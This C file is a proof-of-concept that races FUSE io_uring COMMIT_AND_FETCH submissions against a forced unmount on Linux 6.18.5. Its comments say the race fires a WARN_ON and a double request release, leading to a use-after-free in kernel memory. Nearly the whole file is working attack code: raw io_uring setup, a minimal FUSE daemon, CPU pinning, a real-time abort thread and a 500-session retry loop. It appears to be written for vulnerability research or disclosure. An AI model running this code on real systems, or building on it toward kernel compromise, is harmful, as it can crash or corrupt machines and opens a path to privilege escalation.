/*
 * fuse_uring_race.c — commit_fetch vs teardown race PoC v2
 *
 * Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y
 * Requires: echo 1 > /sys/module/fuse/parameters/enable_uring
 * Run as root: ./fuse_uring_race
 *
 * v2: multi-session loop (N_SESSIONS=200), CPU affinity (CPU_CAF/CPU_ABORT),
 *     SCHED_FIFO abort thread, immediate abort trigger via abort_ready flag,
 *     max FUSE op rate (no child sleep).
 *
 * RACE TARGET: SMP parallel execution on CONFIG_PREEMPT_NONE kernel
 * ─────────────────────────────────────────────────────────────────
 * CPU 0 (CAF thread):
 *   (a) 0x81701cc4: movzbl 0xa4(%r13),%eax  — reads abort flag WITHOUT spinlock
 *   (b) 0x81701cde: call spin_lock           — acquire queue spinlock (memory barrier)
 *   (c) 0x81701d31: cmpl $0x4,0x30(%rbx)   — check state==4 under spinlock
 *   (d) 0x81701d39: jne 0x81701e86          — ud2/WARN_ON if state != 4
 *
 * CPU 1 (abort thread, concurrently):
 *   fuse_uring_abort_end_requests (0x817022d3): queue+0xa4 = 1  (NO spinlock)
 *   fuse_uring_stop_list_entries:  acquire spinlock, state = 5, release
 *
 * Race: CPU 0 reads abort flag=0 at (a), then CPU 1 writes flag=1 AND sets
 * state=5 (under spinlock) before CPU 0 reaches (b). CPU 0 acquires spinlock
 * at (b), sees state=5 → jne fires → ud2 (WARN_ON) at 0x81701e86.
 * Recovery: spin_unlock → fuse_req->error=-EPROTO → fuse_request_end → -EPROTO CQE.
 * Double fuse_request_end (from both recovery and stop_list_entries second loop)
 * → double fuse_put_request → use-after-free on freed fuse_req slab.
 *
 * Compile: gcc -O2 -Wall -o fuse_uring_race fuse_uring_race.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <linux/fuse.h>
#include <linux/io_uring.h>
#include <linux/time_types.h>

/* -----------------------------------------------------------------------
 * Configuration
 * ----------------------------------------------------------------------- */
#define N_SESSIONS   500    /* outer loop iterations                          */
#define CAF_LIMIT   50000   /* max CAF iterations per session (safety cap)    */
#define ABORT_DELAY_MS 50   /* ms after CAF loop starts before abort fires   */
#define CPU_CAF      0      /* main/CAF thread CPU                            */
#define CPU_ABORT    1      /* abort thread CPU — must differ from CPU_CAF    */

/* -----------------------------------------------------------------------
 * FUSE io_uring protocol constants
 * ----------------------------------------------------------------------- */
#define FUSE_OVER_IO_URING              (1u << 9)
#define FUSE_IO_URING_CMD_REGISTER          1
#define FUSE_IO_URING_CMD_COMMIT_AND_FETCH  2
#define REGISTER_BASE  0x5555ULL
#define REGISTER_TAG   (REGISTER_BASE << 8)
#define CAF_TAG        0xdeadULL

/* -----------------------------------------------------------------------
 * Minimal io_uring (no liburing)
 * ----------------------------------------------------------------------- */
struct uring {
    int      fd;
    uint32_t sq_entries, cq_entries;
    uint32_t sqe_size;
    uint32_t *sq_head, *sq_tail, *sq_mask, *sq_array;
    uint32_t *cq_head, *cq_tail, *cq_mask;
    struct io_uring_cqe *cqes;
    void *sqe_map; size_t sqe_sz;
    void *sq_map;  size_t sq_sz;
    void *cq_map;  size_t cq_sz;
};

static int uring_setup(struct uring *u, uint32_t n, uint32_t flags)
{
    struct io_uring_params p = { .flags = flags };
    u->fd = (int)syscall(SYS_io_uring_setup, n, &p);
    if (u->fd < 0) { perror("io_uring_setup"); return -1; }

    u->sq_entries = p.sq_entries;
    u->cq_entries = p.cq_entries;
    u->sqe_size   = (flags & IORING_SETUP_SQE128) ? 128 : 64;

    u->sqe_sz  = (size_t)p.sq_entries * u->sqe_size;
    u->sqe_map = mmap(NULL, u->sqe_sz, PROT_READ|PROT_WRITE,
                      MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_SQES);
    if (u->sqe_map == MAP_FAILED) { perror("mmap sqes"); return -1; }

    u->sq_sz  = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    u->sq_map = mmap(NULL, u->sq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_SQ_RING);
    if (u->sq_map == MAP_FAILED) { perror("mmap sq"); return -1; }
    u->sq_head  = u->sq_map + p.sq_off.head;
    u->sq_tail  = u->sq_map + p.sq_off.tail;
    u->sq_mask  = u->sq_map + p.sq_off.ring_mask;
    u->sq_array = u->sq_map + p.sq_off.array;

    u->cq_sz  = p.cq_off.cqes + (size_t)p.cq_entries * sizeof(struct io_uring_cqe);
    u->cq_map = mmap(NULL, u->cq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, u->fd, IORING_OFF_CQ_RING);
    if (u->cq_map == MAP_FAILED) { perror("mmap cq"); return -1; }
    u->cq_head = u->cq_map + p.cq_off.head;
    u->cq_tail = u->cq_map + p.cq_off.tail;
    u->cq_mask = u->cq_map + p.cq_off.ring_mask;
    u->cqes    = u->cq_map + p.cq_off.cqes;
    return 0;
}

static void uring_close(struct uring *u)
{
    if (u->sqe_map && u->sqe_map != MAP_FAILED) munmap(u->sqe_map, u->sqe_sz);
    if (u->sq_map  && u->sq_map  != MAP_FAILED) munmap(u->sq_map,  u->sq_sz);
    if (u->cq_map  && u->cq_map  != MAP_FAILED) munmap(u->cq_map,  u->cq_sz);
    if (u->fd >= 0) close(u->fd);
    u->fd = -1;
}

static struct io_uring_sqe *uring_get_sqe(struct uring *u)
{
    uint32_t idx = (*u->sq_tail) & (*u->sq_mask);
    u->sq_array[idx] = idx;
    return (struct io_uring_sqe *)((char *)u->sqe_map + idx * u->sqe_size);
}

static int uring_submit(struct uring *u, int n)
{
    __atomic_store_n(u->sq_tail, *u->sq_tail + (uint32_t)n, __ATOMIC_RELEASE);
    return (int)syscall(SYS_io_uring_enter, u->fd, n, 0, 0, NULL, 0);
}

/*
 * Block until one CQE arrives or timeout_ms elapses.
 * min_complete=1 forces io_cqring_wait into the task-work drain loop —
 * required because fuse_uring_send_in_task is posted as task work.
 */
static int32_t uring_poll_cqe(struct uring *u, int timeout_ms,
                               uint64_t *user_data_out)
{
    struct __kernel_timespec ts = {
        .tv_sec  = (long long)(timeout_ms / 1000),
        .tv_nsec = (long long)(timeout_ms % 1000) * 1000000LL,
    };
    struct io_uring_getevents_arg arg = {
        .sigmask    = 0,
        .sigmask_sz = _NSIG / 8,
        .pad        = 0,
        .ts         = (uint64_t)(uintptr_t)&ts,
    };
    syscall(SYS_io_uring_enter, u->fd, 0, 1,
            IORING_ENTER_GETEVENTS | IORING_ENTER_EXT_ARG,
            &arg, sizeof(arg));

    uint32_t h = __atomic_load_n(u->cq_head, __ATOMIC_ACQUIRE);
    uint32_t t = __atomic_load_n(u->cq_tail, __ATOMIC_ACQUIRE);
    if (h != t) {
        uint32_t idx = h & *u->cq_mask;
        int32_t  res = u->cqes[idx].res;
        if (user_data_out) *user_data_out = u->cqes[idx].user_data;
        __atomic_store_n(u->cq_head, h + 1, __ATOMIC_RELEASE);
        return res;
    }
    return -EAGAIN;
}

/* -----------------------------------------------------------------------
 * cmd_req layout in 128-byte SQE:
 *   sqe+48 = cmd[0]  = flags     (u64)
 *   sqe+56 = cmd[8]  = commit_id (u64)
 *   sqe+64 = cmd[16] = qid       (u32)
 * ----------------------------------------------------------------------- */
struct fuse_uring_cmd_req {
    uint64_t flags;
    uint64_t commit_id;
    uint32_t qid;
    uint32_t pad;
};

/* -----------------------------------------------------------------------
 * Session state — one per run_session() call; no inter-session pollution.
 * ----------------------------------------------------------------------- */
struct sess_state {
    int          fuse_fd;
    volatile int daemon_stop;
    volatile uint32_t neg_flags2;
    volatile int abort_ready;   /* set 1 by main just before CAF loop */
    char         mntdir[64];
};

/* -----------------------------------------------------------------------
 * fuse_send — write FUSE response to /dev/fuse fd
 * ----------------------------------------------------------------------- */
static void fuse_send(int fd, uint64_t unique, int err,
                      const void *body, size_t blen)
{
    struct fuse_out_header h = {
        .len    = (uint32_t)(sizeof(h) + blen),
        .error  = err,
        .unique = unique,
    };
    struct iovec iov[2] = { {&h, sizeof h}, {(void *)body, blen} };
    writev(fd, iov, body ? 2 : 1);
}

/* -----------------------------------------------------------------------
 * FUSE daemon — handles FUSE_INIT (negotiates FUSE_OVER_IO_URING),
 * FUSE_GETATTR, FUSE_LOOKUP, FUSE_STATFS, and default ops.
 * Reads s->daemon_stop to exit cleanly when the session ends.
 * ----------------------------------------------------------------------- */
static void *fuse_devfuse_daemon(void *arg)
{
    struct sess_state *s = arg;
    int fd = s->fuse_fd;
    char buf[1 << 17];

    while (!s->daemon_stop) {
        ssize_t n = read(fd, buf, sizeof buf);
        if (n <= 0) break;
        struct fuse_in_header *h = (struct fuse_in_header *)buf;
        char *body = buf + sizeof(*h);

        switch (h->opcode) {
        case FUSE_INIT: {
            struct fuse_init_in *in = (struct fuse_init_in *)body;
            struct fuse_init_out o  = {0};
            o.major     = 7;
            o.minor     = 39;
            o.max_write = 65536;
            o.flags     = in->flags & 0xFFFFFFFFu;
            if (in->flags & 0x40000000u) {
                o.flags2 = FUSE_OVER_IO_URING;
                __atomic_store_n(&s->neg_flags2, o.flags2, __ATOMIC_RELEASE);
            }
            fuse_send(fd, h->unique, 0, &o, sizeof o);
            break;
        }
        case FUSE_GETATTR: {
            struct fuse_attr_out o = {0};
            o.attr_valid = 0;
            o.attr.ino   = h->nodeid;
            o.attr.nlink = 1;
            o.attr.mode  = (h->nodeid == 1) ? (S_IFDIR|0755) : (S_IFREG|0644);
            fuse_send(fd, h->unique, 0, &o, sizeof o);
            break;
        }
        case FUSE_LOOKUP:
            fuse_send(fd, h->unique, -ENOENT, NULL, 0);
            break;
        case FUSE_STATFS: {
            struct fuse_statfs_out o = {0};
            o.st.blocks = 1000; o.st.bfree = 500;
            o.st.namelen = 255; o.st.bsize = 4096;
            fuse_send(fd, h->unique, 0, &o, sizeof o);
            break;
        }
        default:
            fuse_send(fd, h->unique, -ENOSYS, NULL, 0);
            break;
        }
    }
    return NULL;
}

/* -----------------------------------------------------------------------
 * ring_respond — write fuse_out_header+body to out_buf for a ring-dispatched op.
 * ----------------------------------------------------------------------- */
static void ring_respond(const struct fuse_in_header *ih, void *out_buf)
{
    struct fuse_out_header *oh = (struct fuse_out_header *)out_buf;

    switch (ih->opcode) {
    case FUSE_GETATTR: {
        struct fuse_attr_out body = {0};
        body.attr_valid = 1;
        body.attr.ino   = ih->nodeid;
        body.attr.nlink = 1;
        body.attr.mode  = (ih->nodeid == 1) ? (S_IFDIR|0755) : (S_IFREG|0644);
        oh->len    = (uint32_t)(sizeof(*oh) + sizeof(body));
        oh->error  = 0;
        oh->unique = ih->unique;
        memcpy(oh + 1, &body, sizeof(body));
        break;
    }
    case FUSE_LOOKUP:
        oh->len    = sizeof(*oh);
        oh->error  = -ENOENT;
        oh->unique = ih->unique;
        break;
    case FUSE_STATFS: {
        struct fuse_statfs_out body = {0};
        body.st.blocks = 1000; body.st.bfree = 500;
        body.st.namelen = 255; body.st.bsize = 4096;
        oh->len    = (uint32_t)(sizeof(*oh) + sizeof(body));
        oh->error  = 0;
        oh->unique = ih->unique;
        memcpy(oh + 1, &body, sizeof(body));
        break;
    }
    default:
        oh->len    = sizeof(*oh);
        oh->error  = -ENOSYS;
        oh->unique = ih->unique;
        break;
    }
}

/* -----------------------------------------------------------------------
 * abort_thread_fn — fires umount2(MNT_FORCE|MNT_DETACH) on CPU_ABORT.
 *
 * Pinned to CPU_ABORT to ensure true SMP concurrency with the CAF thread
 * on CPU_CAF.  SCHED_FIFO priority 50 ensures it runs immediately when
 * abort_ready is seen, without being preempted by normal tasks.
 *
 * Waits for abort_ready == 1 (set by main just as the CAF loop starts)
 * so that the abort races the CAF loop from the very first iteration.
 * ----------------------------------------------------------------------- */
struct abort_args {
    const char   *mntdir;
    volatile int *ready;
    int           cpu;
    int           delay_ms;  /* sleep after ready before firing umount2 */
};

static void *abort_thread_fn(void *arg)
{
    struct abort_args *a = arg;

    if (a->cpu >= 0) {
        cpu_set_t cs;
        CPU_ZERO(&cs);
        CPU_SET(a->cpu, &cs);
        pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
    }

    struct sched_param sp = { .sched_priority = 50 };
    pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);

    /* Spin until CAF loop is running */
    while (!__atomic_load_n(a->ready, __ATOMIC_ACQUIRE))
        sched_yield();

    /*
     * Let CAF loop run at full speed for delay_ms before firing abort.
     * This ensures many CAF iterations are in-flight during the abort so
     * that P(CPU 0 is in the 14ns movzbl→spin_lock window when CPU 1
     * writes queue+0xa4) ≈ 14ns / 5µs = 0.28% per session.
     */
    if (a->delay_ms > 0)
        usleep((useconds_t)a->delay_ms * 1000);

    umount2(a->mntdir, MNT_FORCE | MNT_DETACH);
    return NULL;
}

/* -----------------------------------------------------------------------
 * submit_caf — build and enqueue a COMMIT_AND_FETCH SQE.
 * ----------------------------------------------------------------------- */
static void submit_caf(struct uring *u, int fuse_fd,
                       void *slot_buf, uint64_t commit_id, uint32_t qid)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    memset(sqe, 0, 128);
    sqe->opcode    = IORING_OP_URING_CMD;
    sqe->fd        = fuse_fd;
    sqe->addr      = (uint64_t)(uintptr_t)slot_buf;
    sqe->len       = 1;
    sqe->cmd_op    = FUSE_IO_URING_CMD_COMMIT_AND_FETCH;
    sqe->user_data = CAF_TAG;
    struct fuse_uring_cmd_req *r = (struct fuse_uring_cmd_req *)((char *)sqe + 48);
    memset(r, 0, sizeof(*r));
    r->commit_id = commit_id;
    r->qid       = qid;
}

/* -----------------------------------------------------------------------
 * run_session — one complete mount → race → unmount iteration.
 *
 * Returns: 1  = WARN_ON triggered (-EPROTO from CAF)
 *          0  = clean abort (-ENODEV or timeout), no race
 *         -1  = setup error (skip to next session)
 * ----------------------------------------------------------------------- */
static int run_session(int sess_id, int nq, int *total_caf_io)
{
    int ret = 0;

    /* All state declared upfront to avoid jumped-over-initialization issues. */
    struct sess_state s;
    pthread_t dtid, atid;
    int dtid_started = 0, atid_started = 0, mounted = 0;
    struct uring u;
    void **in_bufs  = NULL;
    void **out_bufs = NULL;
    struct iovec (*reg_iovs)[2] = NULL;
    void *slot_buf = MAP_FAILED;
    pid_t child = -1;
    int caf_count = 0;
    int q;

    memset(&s, 0, sizeof s);
    memset(&u, 0, sizeof u);
    u.fd = -1;

    /* 1. Open /dev/fuse */
    s.fuse_fd = open("/dev/fuse", O_RDWR | O_CLOEXEC);
    if (s.fuse_fd < 0) { ret = -1; goto cleanup; }

    /* 2. Create mount point and mount */
    snprintf(s.mntdir, sizeof s.mntdir, "/tmp/fuse_race_%d_%d",
             (int)getpid(), sess_id);
    mkdir(s.mntdir, 0755);

    {
        char opts[256];
        snprintf(opts, sizeof opts,
                 "fd=%d,rootmode=40755,user_id=%d,group_id=%d",
                 s.fuse_fd, (int)getuid(), (int)getgid());
        if (mount("fuse_race_test", s.mntdir, "fuse", 0, opts) < 0) {
            ret = -1; goto cleanup;
        }
    }
    mounted = 1;

    /* 3. Start FUSE daemon (handles FUSE_INIT etc. via /dev/fuse) */
    pthread_create(&dtid, NULL, fuse_devfuse_daemon, &s);
    dtid_started = 1;

    /* 4. Poll for FUSE_OVER_IO_URING negotiation (up to 50ms) */
    for (int t = 0; t < 50; t++) {
        if (__atomic_load_n(&s.neg_flags2, __ATOMIC_ACQUIRE) & FUSE_OVER_IO_URING)
            break;
        usleep(1000);
    }
    if (!(__atomic_load_n(&s.neg_flags2, __ATOMIC_ACQUIRE) & FUSE_OVER_IO_URING)) {
        ret = -1; goto cleanup;
    }

    /* 5. Allocate per-queue in/out buffers */
    {
        const size_t in_sz  = 4096;
        const size_t out_sz = 128 * 1024;

        in_bufs   = calloc(nq, sizeof(void *));
        out_bufs  = calloc(nq, sizeof(void *));
        reg_iovs  = calloc(nq, sizeof(*reg_iovs));
        if (!in_bufs || !out_bufs || !reg_iovs) { ret = -1; goto cleanup; }

        for (q = 0; q < nq; q++) {
            in_bufs[q]  = mmap(NULL, in_sz,  PROT_READ|PROT_WRITE,
                               MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
            out_bufs[q] = mmap(NULL, out_sz, PROT_READ|PROT_WRITE,
                               MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
            if (in_bufs[q] == MAP_FAILED || out_bufs[q] == MAP_FAILED) {
                ret = -1; goto cleanup;
            }
            reg_iovs[q][0].iov_base = in_bufs[q];  reg_iovs[q][0].iov_len = in_sz;
            reg_iovs[q][1].iov_base = out_bufs[q]; reg_iovs[q][1].iov_len = out_sz;
        }

        slot_buf = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
        if (slot_buf == MAP_FAILED) { ret = -1; goto cleanup; }

        /* 6. Setup io_uring and submit REGISTER SQEs (one per queue) */
        if (uring_setup(&u, (uint32_t)(nq + 64), IORING_SETUP_SQE128) < 0) {
            ret = -1; goto cleanup;
        }

        for (q = 0; q < nq; q++) {
            memset(in_bufs[q], 0, in_sz);
            struct io_uring_sqe *sqe = uring_get_sqe(&u);
            memset(sqe, 0, 128);
            sqe->opcode    = IORING_OP_URING_CMD;
            sqe->fd        = s.fuse_fd;
            sqe->addr      = (uint64_t)(uintptr_t)reg_iovs[q];
            sqe->len       = 2;
            sqe->cmd_op    = FUSE_IO_URING_CMD_REGISTER;
            sqe->user_data = REGISTER_TAG | (uint64_t)(unsigned char)q;
            struct fuse_uring_cmd_req *r =
                (struct fuse_uring_cmd_req *)((char *)sqe + 48);
            memset(r, 0, sizeof(*r));
            r->qid = (uint32_t)q;
            uring_submit(&u, 1);
        }

        /* Check for immediate REGISTER errors */
        usleep(10000);
        {
            uint32_t h = __atomic_load_n(u.cq_head, __ATOMIC_ACQUIRE);
            uint32_t t2 = __atomic_load_n(u.cq_tail, __ATOMIC_ACQUIRE);
            int rfail = (int)(t2 - h);
            __atomic_store_n(u.cq_head, t2, __ATOMIC_RELEASE);
            if (rfail) { ret = -1; goto cleanup; }
        }

        /* 7. Fork child: tight stat() loop (no sleep) for max FUSE op rate */
        char probe[128];
        snprintf(probe, sizeof probe, "%s/probe", s.mntdir);
        child = fork();
        if (child == 0) {
            struct stat st;
            while (1) stat(probe, &st);
            _exit(0);
        }

        /* 8. Wait for first REGISTER CQE (first FUSE op dispatched to ring) */
        uint64_t first_ud  = 0;
        int32_t  first_res = uring_poll_cqe(&u, 2000, &first_ud);
        if (first_res != 0 ||
            (first_ud & ~0xffULL) != (REGISTER_BASE << 8)) {
            ret = -1; goto cleanup;
        }

        int fired_q = (int)(first_ud & 0xffULL);
        struct fuse_in_header *ih =
            (struct fuse_in_header *)in_bufs[fired_q];
        uint64_t commit_id = ih->unique;
        if (!commit_id) { ret = -1; goto cleanup; }
        ring_respond(ih, out_bufs[fired_q]);

        /* 9. Start abort thread — spins on abort_ready, sleeps delay_ms, fires */
        struct abort_args aargs = {
            .mntdir   = s.mntdir,
            .ready    = &s.abort_ready,
            .cpu      = CPU_ABORT,
            .delay_ms = ABORT_DELAY_MS,
        };
        pthread_create(&atid, NULL, abort_thread_fn, &aargs);
        atid_started = 1;

        /*
         * 10. Release abort thread and start CAF loop simultaneously.
         *
         * CPU 0 (main): enters kernel via io_uring_enter → commit_fetch:
         *   (a) movzbl 0xa4(%r13), %eax   — abort flag read (no lock)
         *   (b) call spin_lock             — acquire + memory barrier
         *   (c) cmpl $0x4, state           — state check under lock
         *
         * CPU 1 (abort, SCHED_FIFO 50): wakes on abort_ready=1, enters kernel
         * via umount2 → fuse_abort_conn:
         *   fuse_uring_abort_end_requests: movb $1, queue+0xa4  (no lock)
         *   fuse_uring_stop_list_entries:  spinlock, state=5, unlock
         *
         * Race fires when CPU 0 reads flag=0 at (a) while CPU 1 writes flag=1
         * and completes stop_list_entries before CPU 0 reaches (b).
         */
        __atomic_store_n(&s.abort_ready, 1, __ATOMIC_RELEASE);

        for (int i = 0; i < CAF_LIMIT; i++) {
            submit_caf(&u, s.fuse_fd, slot_buf, commit_id,
                       (uint32_t)fired_q);
            uring_submit(&u, 1);
            caf_count++;

            uint64_t ud  = 0;
            int32_t  res = uring_poll_cqe(&u, 500, &ud);

            if (res == -EPROTO) {
                /*
                 * commit_fetch WARN_ON recovery path returned -EPROTO:
                 * ud2 at 0xffffffff81701e86 fired.
                 * spin_unlock → fuse_req->error=-EPROTO → fuse_request_end
                 * → io_uring_cmd_done(cmd, -EPROTO) → this CQE.
                 * A second fuse_request_end from stop_list_entries loop 2
                 * will also fire → double fuse_put_request → UAF.
                 */
                printf("[!] *** WARN_ON TRIGGERED *** sess=%d iter=%d\n",
                       sess_id, i);
                printf("    ring_ent->state==5 seen under spinlock in "
                       "fuse_uring_commit_fetch\n");
                printf("    ud2 at 0xffffffff81701e86 — check dmesg\n");
                fflush(stdout);
                ret = 1;
                break;
            }
            if (res != 0) break;  /* -ENODEV: clean abort; -EAGAIN: timeout */

            /* Next op arrived in in_buf; update commit_id */
            uint64_t new_id = ih->unique;
            if (!new_id || new_id == commit_id) {
                usleep(50);
                new_id = ih->unique;
                if (!new_id || new_id == commit_id) break;
            }
            commit_id = new_id;
            ring_respond(ih, out_bufs[fired_q]);
        }
    } /* end buffer scope */

cleanup:
    if (atid_started)  pthread_join(atid, NULL);
    if (child > 0)     { kill(child, SIGKILL); waitpid(child, NULL, 0); }
    if (u.fd >= 0)     uring_close(&u);

    if (in_bufs) {
        for (q = 0; q < nq; q++)
            if (in_bufs[q] && in_bufs[q] != MAP_FAILED)
                munmap(in_bufs[q], 4096);
    }
    if (out_bufs) {
        for (q = 0; q < nq; q++)
            if (out_bufs[q] && out_bufs[q] != MAP_FAILED)
                munmap(out_bufs[q], 128 * 1024);
    }
    free(in_bufs); free(out_bufs); free(reg_iovs);
    if (slot_buf != MAP_FAILED) munmap(slot_buf, 4096);

    if (mounted) {
        s.daemon_stop = 1;
        umount2(s.mntdir, MNT_DETACH);  /* ignore EINVAL if abort already unmounted */
    }
    if (s.fuse_fd >= 0) close(s.fuse_fd);
    if (dtid_started) pthread_join(dtid, NULL);
    if (s.mntdir[0])  rmdir(s.mntdir);

    if (total_caf_io) *total_caf_io += caf_count;
    return ret;
}

/* -----------------------------------------------------------------------
 * main
 * ----------------------------------------------------------------------- */
int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_DFL);

    printf("=== fuse_uring commit_fetch vs teardown race PoC v2 ===\n");
    printf("Kernel: 6.18.5 | CONFIG_FUSE_IO_URING=y\n");
    printf("Sessions: %d | CPU_CAF: %d | CPU_ABORT: %d | abort_delay: %dms\n\n",
           N_SESSIONS, CPU_CAF, CPU_ABORT, ABORT_DELAY_MS);

    /* Enable FUSE io_uring */
    {
        int f = open("/sys/module/fuse/parameters/enable_uring", O_RDWR);
        if (f < 0) { perror("[-] open enable_uring"); return 1; }
        char val = 0;
        read(f, &val, 1);
        if (val != 'Y' && val != '1') write(f, "1", 1);
        close(f);
        printf("[+] enable_uring active\n");
    }

    /* Pin main thread to CPU_CAF for SMP concurrency with abort thread */
    {
        cpu_set_t cs;
        CPU_ZERO(&cs);
        CPU_SET(CPU_CAF, &cs);
        if (sched_setaffinity(0, sizeof(cs), &cs) < 0)
            fprintf(stderr, "[!] sched_setaffinity CPU%d failed: %s "
                    "(continuing without pinning)\n", CPU_CAF, strerror(errno));
        else
            printf("[+] Main thread pinned to CPU%d\n", CPU_CAF);
    }

    int nq = (int)sysconf(_SC_NPROCESSORS_ONLN);
    printf("[+] nr_queues=%d\n\n", nq);

    if (nq < 2) {
        fprintf(stderr, "[-] Need >= 2 CPUs for SMP race (found %d)\n", nq);
        return 1;
    }

    int total_caf = 0;
    int warn_hit  = 0;
    int sessions_run = 0;

    for (int sess = 0; sess < N_SESSIONS; sess++) {
        sessions_run = sess + 1;

        if (sess % 20 == 0)
            printf("[*] Session %d/%d  total_caf=%d\n",
                   sess, N_SESSIONS, total_caf);

        int r = run_session(sess, nq, &total_caf);

        if (r == 1) {
            warn_hit = 1;
            break;
        }
        if (r < 0 && sess == 0) {
            fprintf(stderr, "[-] Session 0 setup failed — aborting\n");
            return 1;
        }
    }

    printf("\n=== Results ===\n");
    printf("Sessions run:      %d / %d\n", sessions_run, N_SESSIONS);
    printf("Total CAF iters:   %d\n", total_caf);
    printf("WARN_ON triggered: %s\n\n", warn_hit ? "YES" : "no");

    printf("  --- dmesg FUSE/kernel BUG hits ---\n");
    system("dmesg 2>/dev/null | grep -iE "
           "'WARNING:|fuse.*uring|ud2|invalid opcode|BUG:|KASAN|use.after.free' "
           "| tail -20 | sed 's/^/    /' || echo '    (none)'");
    printf("\n");

    if (warn_hit) {
        printf("[!] Race confirmed: fuse_uring_commit_fetch saw state=5 under "
               "spinlock.\n");
        printf("    WARN_ON at 0xffffffff81701e86 — double fuse_request_end "
               "→ UAF on fuse_req slab.\n");
        printf("    Check dmesg for KASAN/WARNING report.\n");
    } else {
        printf("[*] WARN_ON not triggered in %d sessions (%d CAF iters).\n",
               sessions_run, total_caf);
        printf("    Options: increase N_SESSIONS, use 'preempt=full' boot param,\n");
        printf("    or verify CPU%d and CPU%d are online.\n",
               CPU_CAF, CPU_ABORT);
    }

    return warn_hit ? 0 : 2;
}
